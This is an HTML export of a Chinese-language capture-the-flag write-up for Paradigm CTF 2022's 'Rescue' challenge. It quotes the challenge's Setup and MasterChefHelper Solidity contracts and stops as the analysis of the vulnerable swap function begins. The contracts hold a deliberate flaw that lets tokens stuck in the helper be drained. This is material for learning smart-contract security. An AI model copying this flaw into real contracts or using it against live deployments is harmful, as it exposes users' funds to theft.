<!DOCTYPE html><html><head>
      <title>ParadigmCTF_2022</title>
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      
      <link rel="stylesheet" href="file:///c:\Users\&#x5C0F;&#x6829;\.vscode\extensions\shd101wyy.markdown-preview-enhanced-0.6.3\node_modules\@shd101wyy\mume\dependencies\katex\katex.min.css">
      
      
      
      
      
      
      
      
      
      <style>
      /**
 * prism.js Github theme based on GitHub's theme.
 * @author Sam Clarke
 */
code[class*="language-"],
pre[class*="language-"] {
  color: #333;
  background: none;
  font-family: Consolas, "Liberation Mono", Menlo, Courier, monospace;
  text-align: left;
  white-space: pre;
  word-spacing: normal;
  word-break: normal;
  word-wrap: normal;
  line-height: 1.4;

  -moz-tab-size: 8;
  -o-tab-size: 8;
  tab-size: 8;

  -webkit-hyphens: none;
  -moz-hyphens: none;
  -ms-hyphens: none;
  hyphens: none;
}

/* Code blocks */
pre[class*="language-"] {
  padding: .8em;
  overflow: auto;
  /* border: 1px solid #ddd; */
  border-radius: 3px;
  /* background: #fff; */
  background: #f5f5f5;
}

/* Inline code */
:not(pre) > code[class*="language-"] {
  padding: .1em;
  border-radius: .3em;
  white-space: normal;
  background: #f5f5f5;
}

.token.comment,
.token.blockquote {
  color: #969896;
}

.token.cdata {
  color: #183691;
}

.token.doctype,
.token.punctuation,
.token.variable,
.token.macro.property {
  color: #333;
}

.token.operator,
.token.important,
.token.keyword,
.token.rule,
.token.builtin {
  color: #a71d5d;
}

.token.string,
.token.url,
.token.regex,
.token.attr-value {
  color: #183691;
}

.token.property,
.token.number,
.token.boolean,
.token.entity,
.token.atrule,
.token.constant,
.token.symbol,
.token.command,
.token.code {
  color: #0086b3;
}

.token.tag,
.token.selector,
.token.prolog {
  color: #63a35c;
}

.token.function,
.token.namespace,
.token.pseudo-element,
.token.class,
.token.class-name,
.token.pseudo-class,
.token.id,
.token.url-reference .token.variable,
.token.attr-name {
  color: #795da3;
}

.token.entity {
  cursor: help;
}

.token.title,
.token.title .token.punctuation {
  font-weight: bold;
  color: #1d3e81;
}

.token.list {
  color: #ed6a43;
}

.token.inserted {
  background-color: #eaffea;
  color: #55a532;
}

.token.deleted {
  background-color: #ffecec;
  color: #bd2c00;
}

.token.bold {
  font-weight: bold;
}

.token.italic {
  font-style: italic;
}


/* JSON */
.language-json .token.property {
  color: #183691;
}

.language-markup .token.tag .token.punctuation {
  color: #333;
}

/* CSS */
code.language-css,
.language-css .token.function {
  color: #0086b3;
}

/* YAML */
.language-yaml .token.atrule {
  color: #63a35c;
}

code.language-yaml {
  color: #183691;
}

/* Ruby */
.language-ruby .token.function {
  color: #333;
}

/* Markdown */
.language-markdown .token.url {
  color: #795da3;
}

/* Makefile */
.language-makefile .token.symbol {
  color: #795da3;
}

.language-makefile .token.variable {
  color: #183691;
}

.language-makefile .token.builtin {
  color: #0086b3;
}

/* Bash */
.language-bash .token.keyword {
  color: #0086b3;
}

/* highlight */
pre[data-line] {
  position: relative;
  padding: 1em 0 1em 3em;
}
pre[data-line] .line-highlight-wrapper {
  position: absolute;
  top: 0;
  left: 0;
  background-color: transparent;
  display: block;
  width: 100%;
}

pre[data-line] .line-highlight {
  position: absolute;
  left: 0;
  right: 0;
  padding: inherit 0;
  margin-top: 1em;
  background: hsla(24, 20%, 50%,.08);
  background: linear-gradient(to right, hsla(24, 20%, 50%,.1) 70%, hsla(24, 20%, 50%,0));
  pointer-events: none;
  line-height: inherit;
  white-space: pre;
}

pre[data-line] .line-highlight:before, 
pre[data-line] .line-highlight[data-end]:after {
  content: attr(data-start);
  position: absolute;
  top: .4em;
  left: .6em;
  min-width: 1em;
  padding: 0 .5em;
  background-color: hsla(24, 20%, 50%,.4);
  color: hsl(24, 20%, 95%);
  font: bold 65%/1.5 sans-serif;
  text-align: center;
  vertical-align: .3em;
  border-radius: 999px;
  text-shadow: none;
  box-shadow: 0 1px white;
}

pre[data-line] .line-highlight[data-end]:after {
  content: attr(data-end);
  top: auto;
  bottom: .4em;
}html body{font-family:"Helvetica Neue",Helvetica,"Segoe UI",Arial,freesans,sans-serif;font-size:16px;line-height:1.6;color:#333;background-color:#fff;overflow:initial;box-sizing:border-box;word-wrap:break-word}html body>:first-child{margin-top:0}html body h1,html body h2,html body h3,html body h4,html body h5,html body h6{line-height:1.2;margin-top:1em;margin-bottom:16px;color:#000}html body h1{font-size:2.25em;font-weight:300;padding-bottom:.3em}html body h2{font-size:1.75em;font-weight:400;padding-bottom:.3em}html body h3{font-size:1.5em;font-weight:500}html body h4{font-size:1.25em;font-weight:600}html body h5{font-size:1.1em;font-weight:600}html body h6{font-size:1em;font-weight:600}html body h1,html body h2,html body h3,html body h4,html body h5{font-weight:600}html body h5{font-size:1em}html body h6{color:#5c5c5c}html body strong{color:#000}html body del{color:#5c5c5c}html body a:not([href]){color:inherit;text-decoration:none}html body a{color:#08c;text-decoration:none}html body a:hover{color:#00a3f5;text-decoration:none}html body img{max-width:100%}html body>p{margin-top:0;margin-bottom:16px;word-wrap:break-word}html body>ul,html body>ol{margin-bottom:16px}html body ul,html body ol{padding-left:2em}html body ul.no-list,html body ol.no-list{padding:0;list-style-type:none}html body ul ul,html body ul ol,html body ol ol,html body ol ul{margin-top:0;margin-bottom:0}html body li{margin-bottom:0}html body li.task-list-item{list-style:none}html body li>p{margin-top:0;margin-bottom:0}html body .task-list-item-checkbox{margin:0 .2em .25em -1.8em;vertical-align:middle}html body .task-list-item-checkbox:hover{cursor:pointer}html body blockquote{margin:16px 0;font-size:inherit;padding:0 15px;color:#5c5c5c;background-color:#f0f0f0;border-left:4px solid #d6d6d6}html body blockquote>:first-child{margin-top:0}html body blockquote>:last-child{margin-bottom:0}html body hr{height:4px;margin:32px 0;background-color:#d6d6d6;border:0 none}html body table{margin:10px 0 15px 0;border-collapse:collapse;border-spacing:0;display:block;width:100%;overflow:auto;word-break:normal;word-break:keep-all}html body table th{font-weight:bold;color:#000}html body table td,html body table th{border:1px solid #d6d6d6;padding:6px 13px}html body dl{padding:0}html body dl dt{padding:0;margin-top:16px;font-size:1em;font-style:italic;font-weight:bold}html body dl dd{padding:0 16px;margin-bottom:16px}html body code{font-family:Menlo,Monaco,Consolas,'Courier New',monospace;font-size:.85em !important;color:#000;background-color:#f0f0f0;border-radius:3px;padding:.2em 0}html body code::before,html body code::after{letter-spacing:-0.2em;content:"\00a0"}html body pre>code{padding:0;margin:0;font-size:.85em !important;word-break:normal;white-space:pre;background:transparent;border:0}html body .highlight{margin-bottom:16px}html body .highlight pre,html body pre{padding:1em;overflow:auto;font-size:.85em !important;line-height:1.45;border:#d6d6d6;border-radius:3px}html body .highlight pre{margin-bottom:0;word-break:normal}html body pre code,html body pre tt{display:inline;max-width:initial;padding:0;margin:0;overflow:initial;line-height:inherit;word-wrap:normal;background-color:transparent;border:0}html body pre code:before,html body pre tt:before,html body pre code:after,html body pre tt:after{content:normal}html body p,html body blockquote,html body ul,html body ol,html body dl,html body pre{margin-top:0;margin-bottom:16px}html body kbd{color:#000;border:1px solid #d6d6d6;border-bottom:2px solid #c7c7c7;padding:2px 4px;background-color:#f0f0f0;border-radius:3px}@media print{html body{background-color:#fff}html body h1,html body h2,html body h3,html body h4,html body h5,html body h6{color:#000;page-break-after:avoid}html body blockquote{color:#5c5c5c}html body pre{page-break-inside:avoid}html body table{display:table}html body img{display:block;max-width:100%;max-height:100%}html body pre,html body code{word-wrap:break-word;white-space:pre}}.markdown-preview{width:100%;height:100%;box-sizing:border-box}.markdown-preview .pagebreak,.markdown-preview .newpage{page-break-before:always}.markdown-preview pre.line-numbers{position:relative;padding-left:3.8em;counter-reset:linenumber}.markdown-preview pre.line-numbers>code{position:relative}.markdown-preview pre.line-numbers .line-numbers-rows{position:absolute;pointer-events:none;top:1em;font-size:100%;left:0;width:3em;letter-spacing:-1px;border-right:1px solid #999;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}.markdown-preview pre.line-numbers .line-numbers-rows>span{pointer-events:none;display:block;counter-increment:linenumber}.markdown-preview pre.line-numbers .line-numbers-rows>span:before{content:counter(linenumber);color:#999;display:block;padding-right:.8em;text-align:right}.markdown-preview .mathjax-exps .MathJax_Display{text-align:center !important}.markdown-preview:not([for="preview"]) .code-chunk .btn-group{display:none}.markdown-preview:not([for="preview"]) .code-chunk .status{display:none}.markdown-preview:not([for="preview"]) .code-chunk .output-div{margin-bottom:16px}.scrollbar-style::-webkit-scrollbar{width:8px}.scrollbar-style::-webkit-scrollbar-track{border-radius:10px;background-color:transparent}.scrollbar-style::-webkit-scrollbar-thumb{border-radius:5px;background-color:rgba(150,150,150,0.66);border:4px solid rgba(150,150,150,0.66);background-clip:content-box}html body[for="html-export"]:not([data-presentation-mode]){position:relative;width:100%;height:100%;top:0;left:0;margin:0;padding:0;overflow:auto}html body[for="html-export"]:not([data-presentation-mode]) .markdown-preview{position:relative;top:0}@media screen and (min-width:914px){html body[for="html-export"]:not([data-presentation-mode]) .markdown-preview{padding:2em calc(50% - 457px + 2em)}}@media screen and (max-width:914px){html body[for="html-export"]:not([data-presentation-mode]) .markdown-preview{padding:2em}}@media screen and (max-width:450px){html body[for="html-export"]:not([data-presentation-mode]) .markdown-preview{font-size:14px !important;padding:1em}}@media print{html body[for="html-export"]:not([data-presentation-mode]) #sidebar-toc-btn{display:none}}html body[for="html-export"]:not([data-presentation-mode]) #sidebar-toc-btn{position:fixed;bottom:8px;left:8px;font-size:28px;cursor:pointer;color:inherit;z-index:99;width:32px;text-align:center;opacity:.4}html body[for="html-export"]:not([data-presentation-mode])[html-show-sidebar-toc] #sidebar-toc-btn{opacity:1}html body[for="html-export"]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc{position:fixed;top:0;left:0;width:300px;height:100%;padding:32px 0 48px 0;font-size:14px;box-shadow:0 0 4px rgba(150,150,150,0.33);box-sizing:border-box;overflow:auto;background-color:inherit}html body[for="html-export"]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc::-webkit-scrollbar{width:8px}html body[for="html-export"]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc::-webkit-scrollbar-track{border-radius:10px;background-color:transparent}html body[for="html-export"]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc::-webkit-scrollbar-thumb{border-radius:5px;background-color:rgba(150,150,150,0.66);border:4px solid rgba(150,150,150,0.66);background-clip:content-box}html body[for="html-export"]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc a{text-decoration:none}html body[for="html-export"]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc ul{padding:0 1.6em;margin-top:.8em}html body[for="html-export"]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc li{margin-bottom:.8em}html body[for="html-export"]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc ul{list-style-type:none}html body[for="html-export"]:not([data-presentation-mode])[html-show-sidebar-toc] .markdown-preview{left:300px;width:calc(100% -  300px);padding:2em calc(50% - 457px -  150px);margin:0;box-sizing:border-box}@media screen and (max-width:1274px){html body[for="html-export"]:not([data-presentation-mode])[html-show-sidebar-toc] .markdown-preview{padding:2em}}@media screen and (max-width:450px){html body[for="html-export"]:not([data-presentation-mode])[html-show-sidebar-toc] .markdown-preview{width:100%}}html body[for="html-export"]:not([data-presentation-mode]):not([html-show-sidebar-toc]) .markdown-preview{left:50%;transform:translateX(-50%)}html body[for="html-export"]:not([data-presentation-mode]):not([html-show-sidebar-toc]) .md-sidebar-toc{display:none}
/* Please visit the URL below for more information: */
/*   https://shd101wyy.github.io/markdown-preview-enhanced/#/customize-css */

      </style>
    </head>
    <body for="html-export">
      <div class="mume markdown-preview  ">
      <h1 class="mume-header" id="paradigm-2022-ctf-%E9%A2%98%E8%A7%A3">paradigm 2022 ctf &#x9898;&#x89E3;</h1>

<hr>
<pre class="language-text">                                                                                        author&#xFF1A;Thomas_Xu
</pre>
<p><strong>&#x73AF;&#x5883;&#x914D;&#x7F6E;</strong>:<br>
&#x6211;&#x91CD;&#x65B0;&#x642D;&#x4E86;&#x4E00;&#x4E2A;hardhat&#x6846;&#x67B6;&#x7684;&#x6D4B;&#x8BD5;&#x73AF;&#x5883;,&#x800C;&#x7531;&#x4E8E;&#x9898;&#x76EE;&#x51FA;&#x5728;&#x4EE5;&#x592A;&#x574A;&#x7684;&#x4E3B;&#x94FE;&#x4E0A;,&#x6211;&#x4F7F;&#x7528;<code>Alchemy</code>fork&#x4E86;&#x4E00;&#x4E2A;&#x4E3B;&#x7F51;&#x8282;&#x70B9;&#x8FDB;&#x884C;&#x6D4B;&#x8BD5;.</p>
<h2 class="mume-header" id="resucue">Resucue</h2>

<p>&#x9996;&#x5148;&#x5148;&#x6765;&#x770B;&#x4E00;&#x4E0B;&#x8FD9;&#x9053;&#x9898;&#x76EE;&#x7684;&#x63CF;&#x8FF0;:<code>I accidentally sent some WETH to a contract, can you help me?</code>&#x770B;&#x8D77;&#x6765;&#x50CF;&#x662F;&#x7531;&#x4E8E;&#x64CD;&#x4F5C;&#x5931;&#x8BEF;,&#x5BFC;&#x81F4;&#x50CF;&#x4E00;&#x4E2A;&#x5408;&#x7EA6;&#x8F6C;&#x4E86;&#x4E00;&#x4E9B;ETH,&#x60F3;&#x8981;&#x5B8C;&#x6210;&#x6B64;Challange&#x5C31;&#x5FC5;&#x987B;&#x8BD5;&#x56FE;&#x633D;&#x6551;&#x4E00;&#x4E0B;&#x8FD9;&#x7B14;&#x635F;&#x5931;.<br>
&#x63A5;&#x4E0B;&#x6765;&#x770B;&#x4E00;&#x770B;&#x5408;&#x7EA6;&#x4EE3;&#x7801;:</p>
<pre data-role="codeBlock" data-info="solidity" class="language-solidity"><span class="token comment">// SPDX-License-Identifier: UNLICENSED</span>

<span class="token keyword keyword-pragma">pragma</span> <span class="token keyword keyword-solidity">solidity</span> <span class="token number">0.8</span><span class="token number">.16</span><span class="token punctuation">;</span>

<span class="token keyword keyword-import">import</span> <span class="token string">&quot;./MasterChefHelper.sol&quot;</span><span class="token punctuation">;</span>
<span class="token keyword keyword-interface">interface</span> <span class="token class-name">WETH9</span> <span class="token keyword keyword-is">is</span> ERC20Like <span class="token punctuation">{</span>
    <span class="token keyword keyword-function">function</span> <span class="token function">deposit</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword keyword-external">external</span> <span class="token keyword keyword-payable">payable</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword keyword-contract">contract</span> <span class="token class-name">Setup</span> <span class="token punctuation">{</span>
    
    WETH9 <span class="token keyword keyword-public">public</span> <span class="token keyword keyword-constant">constant</span> weth <span class="token operator">=</span> <span class="token function">WETH9</span><span class="token punctuation">(</span><span class="token number">0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    MasterChefHelper <span class="token keyword keyword-public">public</span> immutable mcHelper<span class="token punctuation">;</span>

    <span class="token keyword keyword-constructor">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword keyword-payable">payable</span> <span class="token punctuation">{</span>
        mcHelper <span class="token operator">=</span> <span class="token keyword keyword-new">new</span> <span class="token class-name">MasterChefHelper</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        weth<span class="token punctuation">.</span>deposit<span class="token punctuation">{</span>value<span class="token punctuation">:</span> <span class="token number">10</span> ether<span class="token punctuation">}</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        weth<span class="token punctuation">.</span><span class="token function">transfer</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span>mcHelper<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">10</span> ether<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// whoops</span>
    <span class="token punctuation">}</span>

    <span class="token keyword keyword-function">function</span> <span class="token function">isSolved</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword keyword-external">external</span> <span class="token keyword keyword-view">view</span> <span class="token keyword keyword-returns">returns</span> <span class="token punctuation">(</span><span class="token builtin">bool</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword keyword-return">return</span> weth<span class="token punctuation">.</span><span class="token function">balanceOf</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span>mcHelper<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

<span class="token punctuation">}</span>
</pre><p>&#x8FD9;&#x662F;<code>Setup</code>&#x5408;&#x7EA6;,&#x4ECE;&#x4E2D;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x83B7;&#x53D6;&#x4EE5;&#x4E0B;&#x4FE1;&#x606F;:</p>
<ol>
<li>&#x6211;&#x4EEC;&#x4E0D;&#x5C0F;&#x5FC3;&#x5411;<code>mcHelper</code>&#x5408;&#x7EA6;&#x8F6C;&#x4E86;10 <code>ether</code></li>
<li>&#x5B8C;&#x6210;Challange&#x7684;&#x6761;&#x4EF6;&#x662F;&#x8981;&#x6C42;<code>mcHelper</code>&#x5408;&#x7EA6;&#x91CC;&#x6CA1;&#x6709;&#x8FD9;&#x7B14;&#x94B1;<code>return weth.balanceOf(address(mcHelper)) == 0;</code><br>
&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x53EF;&#x80FD;&#x5E76;&#x4E0D;&#x662F;&#x8981;&#x505A;&#x5230;&#x628A;&#x8FD9;&#x7B14;&#x94B1;&#x8F6C;&#x56DE;&#x5230;&#x6211;&#x4EEC;&#x8D26;&#x6237;&#x4E0A;,&#x800C;&#x662F;&#x53EA;&#x9700;&#x8981;&#x4F7F;&#x8FD9;10&#x4E2A;ETH&#x4ECE;<code>mcHelper</code>&#x6D88;&#x5931;&#x5373;&#x53EF;.</li>
</ol>
<p>&#x6709;&#x4E86;&#x4E0A;&#x9762;&#x7684;&#x5206;&#x6790;,&#x4F3C;&#x4E4E;&#x5DF2;&#x7ECF;&#x6709;&#x4E86;&#x7709;&#x76EE;,&#x63A5;&#x4E0B;&#x6765;&#x5206;&#x6790;<code>MasterChefLike</code>&#x5408;&#x7EA6;:</p>
<pre data-role="codeBlock" data-info="solidity" class="language-solidity"><span class="token comment">// SPDX-License-Identifier: UNLICENSED</span>

<span class="token keyword keyword-pragma">pragma</span> <span class="token keyword keyword-solidity">solidity</span> <span class="token number">0.8</span><span class="token number">.16</span><span class="token punctuation">;</span>

<span class="token keyword keyword-import">import</span> <span class="token string">&quot;./UniswapV2Like.sol&quot;</span><span class="token punctuation">;</span>

<span class="token keyword keyword-interface">interface</span> <span class="token class-name">ERC20Like</span> <span class="token punctuation">{</span>
    <span class="token keyword keyword-function">function</span> <span class="token function">transferFrom</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">,</span> <span class="token builtin">address</span><span class="token punctuation">,</span> <span class="token builtin">uint</span><span class="token punctuation">)</span> <span class="token keyword keyword-external">external</span><span class="token punctuation">;</span>
    <span class="token keyword keyword-function">function</span> <span class="token function">transfer</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">,</span> <span class="token builtin">uint</span><span class="token punctuation">)</span> <span class="token keyword keyword-external">external</span><span class="token punctuation">;</span>
    <span class="token keyword keyword-function">function</span> <span class="token function">approve</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">,</span> <span class="token builtin">uint</span><span class="token punctuation">)</span> <span class="token keyword keyword-external">external</span><span class="token punctuation">;</span>
    <span class="token keyword keyword-function">function</span> <span class="token function">balanceOf</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">)</span> <span class="token keyword keyword-external">external</span> <span class="token keyword keyword-view">view</span> <span class="token keyword keyword-returns">returns</span> <span class="token punctuation">(</span><span class="token builtin">uint</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword keyword-interface">interface</span> <span class="token class-name">MasterChefLike</span> <span class="token punctuation">{</span>
    <span class="token keyword keyword-function">function</span> <span class="token function">poolInfo</span><span class="token punctuation">(</span><span class="token builtin">uint256</span> id<span class="token punctuation">)</span> <span class="token keyword keyword-external">external</span> <span class="token keyword keyword-returns">returns</span> <span class="token punctuation">(</span>
        <span class="token builtin">address</span> lpToken<span class="token punctuation">,</span>
        <span class="token builtin">uint256</span> allocPoint<span class="token punctuation">,</span>
        <span class="token builtin">uint256</span> lastRewardBlock<span class="token punctuation">,</span>
        <span class="token builtin">uint256</span> accSushiPerShare
    <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword keyword-contract">contract</span> <span class="token class-name">MasterChefHelper</span> <span class="token punctuation">{</span>

    MasterChefLike <span class="token keyword keyword-public">public</span> <span class="token keyword keyword-constant">constant</span> masterchef <span class="token operator">=</span> <span class="token function">MasterChefLike</span><span class="token punctuation">(</span><span class="token number">0xc2EdaD668740f1aA35E4D8f227fB8E17dcA888Cd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    UniswapV2RouterLike <span class="token keyword keyword-public">public</span> <span class="token keyword keyword-constant">constant</span> router <span class="token operator">=</span> <span class="token function">UniswapV2RouterLike</span><span class="token punctuation">(</span><span class="token number">0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword keyword-function">function</span> <span class="token function">swapTokenForPoolToken</span><span class="token punctuation">(</span><span class="token builtin">uint256</span> poolId<span class="token punctuation">,</span> <span class="token builtin">address</span> tokenIn<span class="token punctuation">,</span> <span class="token builtin">uint256</span> amountIn<span class="token punctuation">,</span> <span class="token builtin">uint256</span> minAmountOut<span class="token punctuation">)</span> <span class="token keyword keyword-external">external</span> <span class="token punctuation">{</span>
        <span class="token punctuation">(</span><span class="token builtin">address</span> lpToken<span class="token punctuation">,</span><span class="token punctuation">,</span><span class="token punctuation">,</span><span class="token punctuation">)</span> <span class="token operator">=</span> masterchef<span class="token punctuation">.</span><span class="token function">poolInfo</span><span class="token punctuation">(</span>poolId<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token builtin">address</span> tokenOut0 <span class="token operator">=</span> <span class="token function">UniswapV2PairLike</span><span class="token punctuation">(</span>lpToken<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">token0</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token builtin">address</span> tokenOut1 <span class="token operator">=</span> <span class="token function">UniswapV2PairLike</span><span class="token punctuation">(</span>lpToken<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">token1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token function">ERC20Like</span><span class="token punctuation">(</span>tokenIn<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">approve</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span>router<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">type</span><span class="token punctuation">(</span><span class="token builtin">uint256</span><span class="token punctuation">)</span><span class="token punctuation">.</span>max<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">ERC20Like</span><span class="token punctuation">(</span>tokenOut0<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">approve</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span>router<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">type</span><span class="token punctuation">(</span><span class="token builtin">uint256</span><span class="token punctuation">)</span><span class="token punctuation">.</span>max<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">ERC20Like</span><span class="token punctuation">(</span>tokenOut1<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">approve</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span>router<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">type</span><span class="token punctuation">(</span><span class="token builtin">uint256</span><span class="token punctuation">)</span><span class="token punctuation">.</span>max<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">ERC20Like</span><span class="token punctuation">(</span>tokenIn<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">transferFrom</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">,</span> <span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword keyword-this">this</span><span class="token punctuation">)</span><span class="token punctuation">,</span> amountIn<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// swap for both tokens of the lp pool</span>
        <span class="token function">_swap</span><span class="token punctuation">(</span>tokenIn<span class="token punctuation">,</span> tokenOut0<span class="token punctuation">,</span> amountIn <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">_swap</span><span class="token punctuation">(</span>tokenIn<span class="token punctuation">,</span> tokenOut1<span class="token punctuation">,</span> amountIn <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// add liquidity and give lp tokens to msg.sender</span>
        <span class="token function">_addLiquidity</span><span class="token punctuation">(</span>tokenOut0<span class="token punctuation">,</span> tokenOut1<span class="token punctuation">,</span> minAmountOut<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword keyword-function">function</span> <span class="token function">_addLiquidity</span><span class="token punctuation">(</span><span class="token builtin">address</span> token0<span class="token punctuation">,</span> <span class="token builtin">address</span> token1<span class="token punctuation">,</span> <span class="token builtin">uint256</span> minAmountOut<span class="token punctuation">)</span> <span class="token keyword keyword-internal">internal</span> <span class="token punctuation">{</span>
        <span class="token punctuation">(</span><span class="token punctuation">,</span><span class="token punctuation">,</span> <span class="token builtin">uint256</span> amountOut<span class="token punctuation">)</span> <span class="token operator">=</span> router<span class="token punctuation">.</span><span class="token function">addLiquidity</span><span class="token punctuation">(</span>
            token0<span class="token punctuation">,</span> 
            token1<span class="token punctuation">,</span> 
            <span class="token function">ERC20Like</span><span class="token punctuation">(</span>token0<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">balanceOf</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword keyword-this">this</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> 
            <span class="token function">ERC20Like</span><span class="token punctuation">(</span>token1<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">balanceOf</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword keyword-this">this</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>             <span class="token comment">//WETH</span>
            <span class="token number">0</span><span class="token punctuation">,</span> 
            <span class="token number">0</span><span class="token punctuation">,</span> 
            msg<span class="token punctuation">.</span>sender<span class="token punctuation">,</span> 
            block<span class="token punctuation">.</span>timestamp
        <span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword keyword-require">require</span><span class="token punctuation">(</span>amountOut <span class="token operator">&gt;=</span> minAmountOut<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword keyword-function">function</span> <span class="token function">_swap</span><span class="token punctuation">(</span><span class="token builtin">address</span> tokenIn<span class="token punctuation">,</span> <span class="token builtin">address</span> tokenOut<span class="token punctuation">,</span> <span class="token builtin">uint256</span> amountIn<span class="token punctuation">)</span> <span class="token keyword keyword-internal">internal</span> <span class="token punctuation">{</span>
        <span class="token builtin">address</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token keyword keyword-memory">memory</span> path <span class="token operator">=</span> <span class="token keyword keyword-new">new</span> <span class="token class-name">address</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        path<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> tokenIn<span class="token punctuation">;</span>
        path<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> tokenOut<span class="token punctuation">;</span>
        router<span class="token punctuation">.</span><span class="token function">swapExactTokensForTokens</span><span class="token punctuation">(</span>
            amountIn<span class="token punctuation">,</span>
            <span class="token number">0</span><span class="token punctuation">,</span>
            path<span class="token punctuation">,</span>
            <span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword keyword-this">this</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
            block<span class="token punctuation">.</span>timestamp
        <span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</pre><p>&#x8FD9;&#x4E2A;&#x5408;&#x7EA6;&#x53EA;&#x6709;&#x4E00;&#x4E2A;&#x5916;&#x90E8;&#x8C03;&#x7528;&#x51FD;&#x6570;:<code>swapTokenForPoolToken()</code>&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x96C6;&#x4E2D;&#x76EE;&#x5149;&#x7814;&#x7A76;&#x6B64;&#x51FD;&#x6570;&#x5373;&#x53EF;.<br>
&#x63A5;&#x4E0B;&#x6765;&#x6211;&#x4EEC;&#x4E00;&#x6B65;&#x4E00;&#x6B65;&#x5206;&#x6790;&#x8FD9;&#x4E2A;&#x51FD;&#x6570;:</p>
